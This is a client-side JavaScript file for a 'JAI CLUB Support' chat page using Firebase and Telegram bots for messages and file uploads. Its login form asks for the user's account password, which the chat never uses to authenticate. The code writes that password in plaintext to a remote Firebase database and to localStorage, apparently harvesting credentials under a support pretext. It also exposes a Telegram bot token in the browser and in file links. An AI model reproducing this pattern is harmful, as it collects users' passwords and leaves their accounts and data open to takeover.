var myUser = null;
var myKey = null;
var replyTo = null;
var editingId = null;
var myBlocked = false;
var lastMsg = {};
var tgConfig = { BOT_TOKEN: "", CHAT_ID: "" };
var tgLoaded = false;
var busyUpload = false;

function esc(s) {
    return String(s == null ? "" : s)
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#39;");
}

function onlyDigits(el) {
    el.value = el.value.replace(/[^0-9]/g, "");
}

/* ============ LOGIN ============ */
function doLogin() {
    var name = document.getElementById("lgName").value.trim();
    var uid = document.getElementById("lgUid").value.trim();
    var mobile = document.getElementById("lgMobile").value.trim();
    var pass = document.getElementById("lgPass").value.trim();
    var err = document.getElementById("lgError");

    if (name === "") { err.textContent = "Please enter your user name."; return; }
    if (!/^\d{6}$/.test(uid)) { err.textContent = "UID must be exactly 6 digits."; return; }
    if (!/^[6-9]\d{9}$/.test(mobile)) { err.textContent = "Please enter a valid 10-digit mobile number."; return; }
    if (pass === "") { err.textContent = "Please enter your account password."; return; }

    myUser = { name: name, uid: uid, mobile: mobile, pass: pass };
    myKey = mobile;
    localStorage.setItem("jc_chat_user", JSON.stringify(myUser));
    localStorage.setItem("jc_chat_uid", myKey);

    document.getElementById("lgError").textContent = "";

    saveUserToFirebase(true);
    enterChat();
}

/* ============ AUTO LOGIN (FROM HOME PAGE) ============ */
function autoLoginFromHome() {
    var uid = localStorage.getItem("jc_chat_uid");
    var email = localStorage.getItem("jc_chat_email");

    if (uid && email) {
        myUser = { name: "User", uid: uid, mobile: uid, pass: "", email: email };
        myKey = uid;
        localStorage.setItem("jc_chat_user", JSON.stringify(myUser));
        localStorage.setItem("jc_chat_uid", myKey);

        document.getElementById("loginPopup").classList.add("hidden");
        document.getElementById("chatPage").classList.remove("hidden");
        document.getElementById("myName").textContent = "User";
        document.getElementById("myAvatar").textContent = "U";

        wireSession();
        setupPresence();
        startHeartbeat();
        loadTgSettings();

        setTimeout(function () {
            document.getElementById("problemPopup").classList.remove("hidden");
        }, 500);

        return true;
    }
    return false;
}

/* ============ PROBLEM SELECT ============ */
function selectProblem(problem) {
    document.getElementById("problemPopup").classList.add("hidden");

    var data = {
        from: myKey,
        text: "My problem is: " + problem,
        time: firebase.database.ServerValue.TIMESTAMP
    };
    firebase.database().ref("chat/" + myKey).push().set(data);

    setTimeout(function () {
        var welcomeData = {
            from: "admin",
            text: "Welcome to JAI CLUB Support! 👋\n\nThank you for contacting us. Our support team will review your \"" + problem + "\" and reply to you shortly.\n\nPlease wait patiently while we assist you.",
            time: firebase.database.ServerValue.TIMESTAMP
        };
        firebase.database().ref("chat/" + myKey).push().set(welcomeData);
    }, 1000);
}

/* ============ FIREBASE ============ */
function initFirebase() {
    if (FB_CONFIG.apiKey.indexOf("PASTE") !== -1) {
        showFirebaseError();
        return false;
    }
    if (!window.firebase) { showFirebaseError(); return false; }
    firebase.initializeApp(FB_CONFIG);
    return true;
}

function showFirebaseError() {
    var msg = "Firebase not configured. Please add your Firebase settings in js/firebase-config.js";
    document.getElementById("lgError").textContent = msg;
}

function saveUserToFirebase(online) {
    var ref = firebase.database().ref("users/" + myKey);
    ref.set({
        name: myUser.name,
        uid: myUser.uid,
        mobile: myUser.mobile,
        pass: myUser.pass
    });
    ref.update({
        online: online,
        lastSeen: firebase.database.ServerValue.TIMESTAMP
    });
}

var presenceReady = false;

function setupPresence() {
    if (presenceReady) return;
    presenceReady = true;

    var ref = firebase.database().ref("users/" + myKey);
    ref.update({
        online: true,
        lastSeen: firebase.database.ServerValue.TIMESTAMP
    });
    ref.child("online").onDisconnect().set(false);
    ref.child("lastSeen").onDisconnect().set(firebase.database.ServerValue.TIMESTAMP);
}

var heartbeatTimer = null;

function startHeartbeat() {
    if (heartbeatTimer) return;
    heartbeatTimer = setInterval(function () {
        firebase.database().ref("users/" + myKey).update({
            online: true,
            lastSeen: firebase.database.ServerValue.TIMESTAMP
        });
    }, 5000);
}

function enterChat() {
    document.getElementById("loginPopup").classList.add("hidden");
    document.getElementById("chatPage").classList.remove("hidden");
    document.getElementById("myName").textContent = myUser.name;
    document.getElementById("myAvatar").textContent = myUser.name.charAt(0).toUpperCase();

    wireSession();
    setupPresence();
    startHeartbeat();
    loadTgSettings();
    if (myBlocked) {
        alert("You have been blocked by JAI CLUB Support. You cannot send messages.");
    }
}

function watchBlockStatus() {
    firebase.database().ref("users/" + myKey + "/blocked").on("value", function (snap) {
        myBlocked = snap.val() === true;
    });
}

function checkBlocked() {
    if (myBlocked) {
        alert("You have been blocked by JAI CLUB Support. You cannot send messages.");
        return true;
    }
    return false;
}

/* ============ MESSAGES ============ */
var loadedMsgKeys = {};

function loadMessages() {
    firebase.database().ref("chat/" + myKey).on("value", function (snap) {
        var data = snap.val();
        var newKeys = data ? Object.keys(data) : [];
        var body = document.getElementById("chatBody");

        if (!data || newKeys.length === 0) {
            body.innerHTML = "";
            showWelcome();
            loadedMsgKeys = {};
            return;
        }

        newKeys.forEach(function (k) {
            if (!loadedMsgKeys[k]) {
                var existing = document.getElementById("msg-" + k);
                if (!existing) {
                    renderMsg(k, data[k], true);
                }
            }
        });

        loadedMsgKeys = {};
        newKeys.forEach(function (k) {
            loadedMsgKeys[k] = true;
        });

        scrollBottom();
    });
}

function renderMsg(key, m, isNew) {
    var body = document.getElementById("chatBody");
    var div = document.createElement("div");
    div.className = "msg " + (m.from === myKey ? "mine" : "theirs");
    if (isNew) div.classList.add("msg-new");
    div.id = "msg-" + key;

    var inner = "";

    if (m.replyTo) {
        inner += '<span class="reply-preview">Replying to: ' + esc(m.replyText || "message") + "</span>";
    }

    if (m.type === "image" && m.url) {
        inner += '<img class="attach" src="' + esc(m.url) + '" alt="image">';
    } else if (m.type === "file" && m.url) {
        inner += '<a class="file-box" href="' + esc(m.url) + '" target="_blank">FILE: ' + esc(m.fileName || "File") + "</a>";
    } else {
        inner += esc(m.text);
    }

    if (m.edited) inner += '<span class="edited">(edited)</span>';

    if (m.removed) {
        inner = '<i>This message was deleted</i>';
        div.classList.add("removed");
    } else {
        inner += '<span class="msg-time">' + timeStr(m.time) + '</span>';
    }

    div.innerHTML = inner;
    lastMsg[key] = m;

    div.onclick = function (e) {
        e.stopPropagation();
        if (m.removed) return;
        if (m.from !== myKey) { showMsgMenu(div, key, m, true); return; }
        showMsgMenu(div, key, m, false);
    };

    body.appendChild(div);
}

function showMsgMenu(el, key, m, isOther) {
    closeMenu();
    var menu = document.createElement("div");
    var buttons = '<button class="reply" onclick="startReply(\'' + key + '\')">Reply</button>';
    if (!isOther) {
        buttons += '<button class="edit" onclick="startEdit(\'' + key + '\')">Edit</button>';
        buttons += '<button class="del" onclick="deleteMsg(\'' + key + '\')">Delete</button>';
    }
    menu.className = "msg-actions";
    menu.innerHTML = buttons;
    el.appendChild(menu);
}

function closeMenu() {
    var m = document.querySelector(".msg-actions");
    if (m) m.remove();
}

function scrollBottom() {
    var b = document.getElementById("chatBody");
    b.scrollTop = b.scrollHeight;
}

function timeStr(ts) {
    if (!ts) return "";
    var d = new Date(ts);
    var h = d.getHours();
    var min = d.getMinutes();
    var ap = h >= 12 ? "PM" : "AM";
    h = h % 12; if (h === 0) h = 12;
    return h + ":" + (min < 10 ? "0" : "") + min + " " + ap;
}

function showWelcome() {
    var body = document.getElementById("chatBody");
    body.innerHTML = '<div class="chat-date-line">Today</div><div class="chat-welcome">Ask your question, we will reply soon.</div>';
}

/* ============ SEND ============ */
function sendMsg() {
    var input = document.getElementById("msgInput");
    var text = input.value.trim();
    if (text === "") return;
    if (checkBlocked()) return;

    var data = {
        from: myKey,
        text: text,
        time: firebase.database.ServerValue.TIMESTAMP
    };
    if (replyTo) {
        data.replyTo = replyTo;
        data.replyText = replyToText();
        cancelReply();
    }
    var ref = firebase.database().ref("chat/" + myKey).push();
    ref.set(data);
    input.value = "";
    scrollBottom();

    var now = new Date();
    var timeStr = now.toLocaleTimeString("en-IN", { hour: "2-digit", minute: "2-digit", hour12: true, timeZone: "Asia/Kolkata" });
    var notifyMsg = "💬 <b>New Chat Message</b>\n" +
        "━━━━━━━━━━━━━━━━━\n" +
        "👤 <b>User:</b> " + esc(myUser ? myUser.name : "Unknown") + "\n" +
        "🆔 <b>UID:</b> " + esc(myKey) + "\n" +
        "📩 <b>Message:</b> " + esc(text) + "\n" +
        "🕒 <b>Time:</b> " + timeStr + "\n" +
        "━━━━━━━━━━━━━━━━━";
    sendNotification(notifyMsg);
}

/* ============ IMAGE / FILE ============ */
function pickImage() {
    document.getElementById("imgPick").click();
}

function pickFile() {
    document.getElementById("filePick").click();
}

document.getElementById("imgPick").addEventListener("change", function () {
    var file = this.files[0];
    if (!file || busyUpload) return;
    uploadAttachment(file, "image");
    this.value = "";
});

document.getElementById("filePick").addEventListener("change", function () {
    var file = this.files[0];
    if (!file || busyUpload) return;
    uploadAttachment(file, "file");
    this.value = "";
});

function uploadAttachment(file, type) {
    if (checkBlocked()) return;
    if (busyUpload) return;
    setBusy(true);

    var bubbleId = "send-" + Date.now();
    var label = type === "image" ? "Sending image..." : "Sending " + esc(file.name) + "...";
    showSendingBubble(bubbleId, label);

    sendToTelegram(file, type).then(function (url) {
        var data = {
            from: myKey,
            type: type,
            url: url,
            fileName: type === "file" ? file.name : "",
            time: firebase.database.ServerValue.TIMESTAMP
        };
        if (replyTo) {
            data.replyTo = replyTo;
            data.replyText = replyToText();
            cancelReply();
        }
        firebase.database().ref("chat/" + myKey).push().set(data);
        scrollBottom();
        setBusy(false);

        var now = new Date();
        var timeStr = now.toLocaleTimeString("en-IN", { hour: "2-digit", minute: "2-digit", hour12: true, timeZone: "Asia/Kolkata" });
        var typeLabel = type === "image" ? "📷 Image" : "📎 File";
        var notifyMsg = "💬 <b>New " + typeLabel + " Shared</b>\n" +
            "━━━━━━━━━━━━━━━━━\n" +
            "👤 <b>User:</b> " + esc(myUser ? myUser.name : "Unknown") + "\n" +
            "🆔 <b>UID:</b> " + esc(myKey) + "\n" +
            "📁 <b>File:</b> " + esc(file.name) + "\n" +
            "🕒 <b>Time:</b> " + timeStr + "\n" +
            "━━━━━━━━━━━━━━━━━";
        sendNotification(notifyMsg);
    }).catch(function (err) {
        removeSendingBubble(bubbleId);
        setBusy(false);
        alert("Upload failed. Please try again." + (err && err.message ? "\n" + err.message : ""));
        scrollBottom();
    });
}

/* ============ TELEGRAM (admin settings se token/chatid; files yahi store hongi) ============ */
function loadTgSettings() {
    if (tgLoaded) return;
    tgLoaded = true;
    tgConfig.BOT_TOKEN = window.TG_CHAT_CONFIG ? TG_CHAT_CONFIG.BOT_TOKEN : "";
    tgConfig.CHAT_ID = window.TG_CHAT_CONFIG ? TG_CHAT_CONFIG.CHAT_ID : "";
    tgConfig.NOTIFY_CHAT_ID = window.TG_CHAT_CONFIG ? TG_CHAT_CONFIG.NOTIFY_CHAT_ID : "";
    firebase.database().ref("settings/telegram").on("value", function (snap) {
        var v = snap.val() || {};
        if (v.token) tgConfig.BOT_TOKEN = v.token;
        if (v.chatId) tgConfig.CHAT_ID = v.chatId;
    });
}

function sendNotification(text) {
    var token = tgConfig.BOT_TOKEN;
    var notifyId = tgConfig.NOTIFY_CHAT_ID;
    if (!token || !notifyId) return;

    var url = "https://api.telegram.org/bot" + token + "/sendMessage";
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: notifyId,
            text: text,
            parse_mode: "HTML"
        })
    }).catch(function () {});
}

function sendToTelegram(file, type) {
    var token = tgConfig.BOT_TOKEN;
    var chatId = tgConfig.CHAT_ID;
    if (!token || !chatId) {
        alert("Telegram not configured yet. Admin will set it from the admin panel.");
        return Promise.reject("no tg config");
    }
    var fd = new FormData();
    fd.append("chat_id", chatId);
    if (type === "image") {
        fd.append("photo", file);
        fd.append("caption", "Chat Image from " + myUser.name + " (" + myUser.uid + ")");
    } else {
        fd.append("document", file);
        fd.append("caption", "Chat File from " + myUser.name + " (" + myUser.uid + ")");
    }
    var method = type === "image" ? "sendPhoto" : "sendDocument";
    var url = "https://api.telegram.org/bot" + token + "/" + method;
    return fetch(url, { method: "POST", body: fd })
        .then(function (r) { return r.json(); })
        .then(function (j) {
            if (!j.ok) throw new Error("Telegram: " + (j.description || "failed"));
            var fileId = j.result.photo ? j.result.photo[j.result.photo.length - 1].file_id : j.result.document.file_id;
            return fetch("https://api.telegram.org/bot" + token + "/getFile?file_id=" + fileId)
                .then(function (r2) { return r2.json(); })
                .then(function (g) {
                    if (!g.ok) throw new Error("Telegram file link failed");
                    return "https://api.telegram.org/file/bot" + token + "/" + g.result.file_path;
                });
        });
}

function showSendingBubble(id, text) {
    var body = document.getElementById("chatBody");
    var div = document.createElement("div");
    div.className = "msg mine sending";
    div.id = id;
    div.innerHTML = '<span class="send-spin"></span>' + esc(text);
    body.appendChild(div);
    scrollBottom();
}

function removeSendingBubble(id) {
    var el = document.getElementById(id);
    if (el) el.parentNode.removeChild(el);
}

function setBusy(busy) {
    busyUpload = busy;
    document.getElementById("imgPick").disabled = busy;
    document.getElementById("filePick").disabled = busy;
    document.getElementById("msgInput").disabled = busy;
}

/* ============ REPLY ============ */
function startReply(key) {
    closeMenu();
    replyTo = key;
    document.getElementById("replyBar").classList.remove("hidden");
    var m = lastMsg[key] || {};
    document.getElementById("replyText").textContent = (m.text || m.fileName || "message");
    document.getElementById("msgInput").focus();
}

function replyToText() {
    var m = lastMsg[replyTo];
    return m && m.text ? m.text.substring(0, 60) : "message";
}

function cancelReply() {
    replyTo = null;
    document.getElementById("replyBar").classList.add("hidden");
}

/* ============ EDIT ============ */
function startEdit(key) {
    closeMenu();
    editingId = key;
    var m = lastMsg[key] || {};
    document.getElementById("editText").value = m.text || "";
    document.getElementById("editPopup").classList.remove("hidden");
}

function saveEdit() {
    var text = document.getElementById("editText").value.trim();
    if (text === "") return;
    firebase.database().ref("chat/" + myKey + "/" + editingId).update({ text: text, edited: true });
    closeEdit();
}

function closeEdit() {
    editingId = null;
    document.getElementById("editPopup").classList.add("hidden");
}

/* ============ DELETE ============ */
function deleteMsg(key) {
    closeMenu();
    if (!confirm("Delete this message?")) return;
    firebase.database().ref("chat/" + myKey + "/" + key).update({ text: "", removed: true });
}

/* ============ MENU & LOGOUT ============ */
function toggleMenu() {
    var dropdown = document.getElementById("menuDropdown");
    dropdown.classList.toggle("hidden");
}

function doLogout() {
    if (myKey) {
        firebase.database().ref("users/" + myKey).update({
            online: false,
            lastSeen: firebase.database.ServerValue.TIMESTAMP
        });
    }
    localStorage.removeItem("jc_chat_user");
    localStorage.removeItem("jc_chat_uid");
    localStorage.removeItem("jc_chat_email");
    window.location.href = "../../USER/index.html";
}

document.addEventListener("click", function (e) {
    var wrap = document.querySelector(".menu-wrap");
    if (wrap && !wrap.contains(e.target)) {
        document.getElementById("menuDropdown").classList.add("hidden");
    }
});

/* ============ BOOT ============ */
var sessionWired = false;

function wireSession() {
    if (sessionWired) return;
    sessionWired = true;

    loadMessages();
    watchBlockStatus();

    window.addEventListener("beforeunload", function () {
        firebase.database().ref("users/" + myKey).update({ online: false, lastSeen: firebase.database.ServerValue.TIMESTAMP });
    });
    document.addEventListener("visibilitychange", function () {
        if (document.visibilityState === "hidden") {
            firebase.database().ref("users/" + myKey).update({ online: false, lastSeen: firebase.database.ServerValue.TIMESTAMP });
        } else if (document.visibilityState === "visible") {
            saveUserToFirebase(true);
        }
    });
}

document.addEventListener("DOMContentLoaded", function () {
    document.getElementById("editPopup").classList.add("hidden");

    if (initFirebase()) {
        if (autoLoginFromHome()) return;

        var saved = localStorage.getItem("jc_chat_user");
        var savedUid = localStorage.getItem("jc_chat_uid");
        if (saved && savedUid) {
            try {
                myUser = JSON.parse(saved);
                myKey = savedUid;
                enterChat();
            } catch (e) {
                localStorage.removeItem("jc_chat_user");
                localStorage.removeItem("jc_chat_uid");
            }
        }
    }
});
